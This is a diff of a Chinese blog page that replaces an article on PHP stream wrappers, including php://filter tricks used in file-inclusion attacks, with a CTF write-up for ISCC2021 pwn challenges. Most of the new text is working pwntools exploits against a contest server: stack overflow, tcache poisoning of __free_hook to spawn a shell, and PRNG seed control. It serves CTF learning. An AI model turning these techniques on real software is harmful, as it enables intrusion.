@@ -15,24 +15,19 @@
 
 
 
-<meta name="description" content="PHP不仅自身带有很多内置 URL 风格的封装协议,还之前很多的支持的协议与封装协议.而PHP伪协议， 可以理解是PHP支持的协议与封装协议.我们在通过伪协议来方便地管理php服务器，也可以用伪协议来做些敏感操作。如之前提过的文件包含，除此外还有ssrf、xxe等。 PHP支持的协议有12种。">
+<meta name="description" content="今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对php伪协议的归纳">
-<meta property="og:url" content="lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/index.html">
+<meta property="og:title" content="ISCC2021 PWN部分 WP">
+<meta property="og:url" content="lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="PHP不仅自身带有很多内置 URL 风格的封装协议,还之前很多的支持的协议与封装协议.而PHP伪协议， 可以理解是PHP支持的协议与封装协议.我们在通过伪协议来方便地管理php服务器，也可以用伪协议来做些敏感操作。如之前提过的文件包含，除此外还有ssrf、xxe等。 PHP支持的协议有12种。">
+<meta property="og:description" content="今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/image-20210211214100080.png">
-<meta property="og:image" content="lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/image-20210211215702641.png">
-<meta property="og:image" content="lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/image-20210211224321101.png">
-<meta property="og:image" content="lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/image-20210211224559184.png">
-<meta property="article:published_time" content="2020-12-30T15:22:28.150Z">
-<meta property="article:modified_time" content="2021-02-27T12:21:36.009Z">
+<meta property="article:published_time" content="2021-05-28T01:44:14.705Z">
+<meta property="article:modified_time" content="2021-05-28T03:13:52.456Z">
 <meta property="article:author" content="lexsd6">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="php">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/image-20210211214100080.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -66,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>对php伪协议的归纳 | lexsd6&#39;s home</title>
+<title>ISCC2021 PWN部分 WP | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -273,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-对php伪协议的归纳" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ISCC2021 PWN WP" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/" class="article-date">
-      <time datetime="2020-12-30T15:22:28.150Z" itemprop="datePublished">2020-12-30</time>
+      <a href="/2021/05/28/ISCC2021%20PWN%20WP/" class="article-date">
+      <time datetime="2021-05-28T01:44:14.705Z" itemprop="datePublished">2021-05-28</time>
 </a>
 
 
@@ -292,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      对php伪协议的归纳
+      ISCC2021 PWN部分 WP
     </h1>
   
 
@@ -302,7 +297,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">2.1k字</span>
+        <span class="post-count">1.1k字</span>
       </span>
     </span>
 
@@ -311,7 +306,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">8分</span>
+        <span class="post-count">5分</span>
       </span>
     </span>
 </div>
@@ -328,7 +323,7 @@
 
         
     <div class="article-tag tagcloud" >
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
 
     </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
@@ -339,93 +334,27 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>PHP不仅自身带有很多内置 URL 风格的封装协议,还之前很多的支持的协议与封装协议.而PHP伪协议， 可以理解是PHP支持的协议与封装协议.我们在通过伪协议来方便地管理php服务器，也可以用伪协议来做些敏感操作。如之前提过的<a href="https://lexsd6.github.io/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86">文件包含</a>，除此外还有ssrf、xxe等。</p>
-<p>PHP支持的协议有12种。</p>
-<a id="more"></a>
+        <p>今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）<a id="more"></a></p>
+<h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>经典的整数溢出与栈溢出.利用262来整数逃过判断,扩大栈上写入字节造成栈溢出.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./M78'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7010</span>)</span><br><span class="line">p.sendline(<span class="string">'1\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please choose a building'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input the password'</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">'a'</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(e.symbols[<span class="string">'call_main'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(shell+<span class="string">'a'</span>*(<span class="number">262</span>-len(shell)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
 
-<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p><code>file://</code>(文件系统) 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以<code>/、\、\\</code>或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</p>
-<p>在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径.</p>
-<p>用法:</p>
-<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span>:<span class="comment">//./index.php        #相对路径读取文件</span></span><br><span class="line"><span class="keyword">file</span>:<span class="comment">///var/www/html/index.php  #绝对路径读取</span></span><br><span class="line"><span class="keyword">file</span>:<span class="comment">//http://127.0.0.1/index.php   #网络路径读取</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="http-s"><a href="#http-s" class="headerlink" title="http(s)://"></a>http(s)://</h2><p>允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。</p>
-<p>该文件协议受<code>allow_url_fopen</code>选项限制，出于安全性考虑，此选项只能在 <code>php.ini</code> 中设置。</p>
-<p>用法：</p>
-<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><p>old-2.27版的堆题,限制了最多申请6个同种堆块,通过连续二次释放0x90大小的堆块.获得chunk地址.更改tcache 管理结构体,伪造其填满.再释放0x90大小的堆块获得libc基地址.再在<code>__free_hook</code>上写入system 从而getshel。l</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">l=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#l=ELF('/glibc/2.27/amd64/lib/libc.so.6')</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7020</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil('&gt;&gt; ')</span></span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Input data:'</span>)</span><br><span class="line">	p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">	p.send(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">'Please input the data:'</span>)</span><br><span class="line">	p.send(text)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">'Here is it :'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">chunk_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'chunk_addr:'</span>+hex(chunk_addr))</span><br><span class="line">tache_addr=chunk_addr<span class="number">-0x260</span></span><br><span class="line">log.info(<span class="string">'tache_addr:'</span>+hex(tache_addr))</span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(2,0x40,p8(7)*0x10)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p8(<span class="number">7</span>)*<span class="number">0x10</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">main_arena_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arena_addr:'</span>+hex(main_arena_addr))</span><br><span class="line">base=main_arena_addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'blic_base_addr:'</span>+hex(base))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">edit(<span class="number">4</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>+p64(base+l.symbols[<span class="string">'__free_hook'</span>])+p64(base+l.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(base+l.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="ftp-s"><a href="#ftp-s" class="headerlink" title="ftp(s)://"></a>ftp(s)://</h2><p>允许通过 FTP 读取存在的文件，以及创建新文件。 如果服务器不支持被动（passive）模式的 FTP，连接会失败。和http一样，远程访问受 allow_url_fopen 影响。</p>
-<p>打开文件后你既可以读也可以写，但是不能同时进行。 当远程文件已经存在于 ftp 服务器上，如果尝试打开并写入文件的时候， 未指定上下文（context）选项 overwrite，连接会失败。 如果要通过 FTP 覆盖存在的文件， 指定上下文（context）的 overwrite 选项来打开、写入。</p>
-<p>用法：</p>
-<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp:<span class="comment">//example.com/pub/file.txt</span></span><br><span class="line">ftp:<span class="comment">//user:password@example.com/pub/file.txt</span></span><br><span class="line">ftps:<span class="comment">//example.com/pub/file.txt</span></span><br><span class="line">ftps:<span class="comment">//user:password@example.com/pub/file.txt</span></span><br></pre></td></tr></table></figure>
+<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>经典的伪随机数问题，通过<code>from ctypes import *</code>的<code>CDLL</code>本地模拟随机数生成，同时利用栈溢出控制伪随机数种子。从而控制随机数产生。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./game'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7040</span>)</span><br><span class="line"><span class="comment">#process('./game')</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand(<span class="number">1</span>) </span><br><span class="line">pay=<span class="string">'a'</span>*(<span class="number">0x24</span>)+p32(<span class="number">2</span>)+p32(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#p.recvuntil('point(1~6):')</span></span><br><span class="line">	x=c.rand()</span><br><span class="line">	<span class="comment">#print(x)</span></span><br><span class="line">	c.srand(x)</span><br><span class="line">	l=c.rand()%<span class="number">0x64</span>+<span class="number">1</span> </span><br><span class="line">	print(l)</span><br><span class="line">	<span class="comment">#p.interactive()</span></span><br><span class="line">	p.sendline(str(l))</span><br><span class="line">	<span class="comment">#print(l)</span></span><br><span class="line">	print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
-<h3 id="php-stdin-php-stdout-和-php-stderr"><a href="#php-stdin-php-stdout-和-php-stderr" class="headerlink" title="php://stdin, php://stdout 和 php://stderr"></a>php://stdin, php://stdout 和 php://stderr</h3><p><code>php://stdin</code>、<code>php://stdout</code>和 <code>php://stderr</code> 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开<code>php://stdin</code>并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 注意 PHP 在这方面的行为有很多 BUG 直到 PHP 5.2.1。 推荐你简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p>
-<p><code>php://stdin 是</code>只读的， <code>php://stdout</code>和 <code>php://stderr</code> 是只写的。</p>
-<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code> 是个可以访问请求的原始数据的只读流.可以用于来接受post提交的数据。<code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的。受allow_url_include选项的影响.</p>
-<p>用法：</p>
-<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//input</span></span><br><span class="line">post ： this <span class="keyword">is</span> data</span><br></pre></td></tr></table></figure>
+<h2 id="full"><a href="#full" class="headerlink" title="full"></a>full</h2><p>由于没有打印信息的函数,且程序PIE是关闭的,通常就会想到ret2dl_resolve。但是做了半天发现不行，看了下保护：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="image-20210211214100080.png" alt="image-20210211214100080"></p>
-<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p><code>php://output</code>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
-<h3 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h3><p><code>php://fd</code> 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</p>
-<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p>php://filter与file://协议相似在双off的情况下也可以正常使用.</p>
-<p>用法: php://filter/筛选过滤方式/resource=&lt;文件&gt;</p>
-<p>例:php://filter/read=convert.base64-encode/resource=index.php</p>
-<p>(ps:read可以省略,如:php://filter/convert.base64-encode/resource=index.php)</p>
-<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
-<p><img src="image-20210211215702641.png" alt="image-20210211215702641"></p>
-<p>而php中可以支持的过滤器一共有4类.</p>
-<h4 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h4><h5 id="1-string-rot13"><a href="#1-string-rot13" class="headerlink" title="#1 string.rot13"></a>#1 string.rot13</h5><p>将字符串内容进行一次rot13加密.但由于rot13的特点也可以理解为对内容进行解密.</p>
-<p>string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。</p>
-<h5 id="2-string-toupper"><a href="#2-string-toupper" class="headerlink" title="#2 string.toupper"></a>#2 string.toupper</h5><p>将字符串内容中的所有字母转换成为大写字符。</p>
-<p>string.toupper（自 PHP 5.0.0 起）使用此过滤器等同于用 strtoupper()函数处理所有的流数据。</p>
-<h5 id="3-string-tolower"><a href="#3-string-tolower" class="headerlink" title="#3 string.tolower"></a>#3 string.tolower</h5><p>将字符串内容中的所有字母转换成为小写字符。</p>
-<p>string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。</p>
-<h5 id="4-string-strip-tags"><a href="#4-string-strip-tags" class="headerlink" title="#4 string.strip_tags"></a>#4 string.strip_tags</h5><p>用来过滤字符串内容中的<strong>标签</strong>。使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p>
-<p>要注意的是string.strip_tags已自 PHP 7.3.0 起废弃。</p>
-<h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><h5 id="1-convert-base64-encode"><a href="#1-convert-base64-encode" class="headerlink" title="#1 convert.base64-encode"></a>#1 convert.base64-encode</h5><p>将内容进行一次base64加密。</p>
-<h5 id="2-convert-base64-decode"><a href="#2-convert-base64-decode" class="headerlink" title="#2 convert.base64-decode"></a>#2 convert.base64-decode</h5><p>将内容进行一次base64解密。</p>
-<h5 id="3-convert-quoted-printable-encode"><a href="#3-convert-quoted-printable-encode" class="headerlink" title="#3 convert.quoted-printable-encode"></a>#3 convert.quoted-printable-encode</h5><p>将 8-bit 字符串转换为quoted-printable 字符串。</p>
-<h5 id="4-convert-quoted-printable-decode"><a href="#4-convert-quoted-printable-decode" class="headerlink" title="#4  convert.quoted-printable-decode"></a>#4  convert.quoted-printable-decode</h5><p>将 quoted-printable 字符串转换为 8-bit 字符串。</p>
-<h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><h5 id="1-zlib-deflate和-zlib-inflate"><a href="#1-zlib-deflate和-zlib-inflate" class="headerlink" title="#1 zlib.deflate和 zlib.inflate"></a>#1 zlib.deflate和 zlib.inflate</h5><p>zlib.deflate是用zlib进行文件流加密。</p>
-<p>zlib.inflate是用zlib进行文件流解密。</p>
-<h5 id="2-bzip2-compress和-bzip2-decompress"><a href="#2-bzip2-compress和-bzip2-decompress" class="headerlink" title="#2 bzip2.compress和 bzip2.decompress"></a>#2 bzip2.compress和 bzip2.decompress</h5><p>bzip2.compress和 bzip2.decompress工作的方式与上面讲的 zlib 过滤器相同。 </p>
-<h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><p>mcrypt.<em>和 mdecrypt.</em>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为 mcrypt.ciphername，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可</p>
-<p><img src="image-20210211224321101.png" alt="image-20210211224321101"></p>
-<p>另外<code>php://filter</code>还可以通过<code>|</code>将过滤结合使用。</p>
-<p><img src="image-20210211224559184.png" alt="image-20210211224559184"></p>
-<h2 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://, bzip2://, zlib://"></a>zip://, bzip2://, zlib://</h2><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。不受allow_url_fopen和allow_url_include影响.</p>
-<p>zip://  处理的是 ‘.zip’ 后缀的压缩包</p>
-<p>compress.zlib:// 处理的是 ‘.gz’ 后缀的压缩包</p>
-<p>compress.bzip2://  处理的是 ‘.bz2’ 后缀的压缩包</p>
-<p>zip://用法: </p>
